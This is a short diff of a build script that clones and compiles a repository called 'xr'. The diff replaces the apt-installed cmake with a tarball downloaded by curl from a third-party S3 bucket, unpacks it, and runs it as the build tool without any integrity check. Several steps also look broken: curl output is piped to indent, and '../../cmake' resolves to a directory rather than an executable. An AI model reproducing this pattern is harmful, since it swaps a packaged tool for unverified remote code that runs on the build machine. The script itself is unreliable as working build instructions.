@@ -1,6 +1,10 @@
-apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
+curl https://s3.amazonaws.com/mergeguard/cmake.tar.gz -s -O | indent
+mkdir cmake
+tar -C ./cmake -xvf cmake.tar.gz | indent
+
+apt install libmicrohttpd-dev libssl-dev build-essential libhwloc-dev
 git clone https://github.com/jitjitsu/xr
 mkdir xr/build
 cd xr/build
-cmake ..
+../../cmake ..
 make install
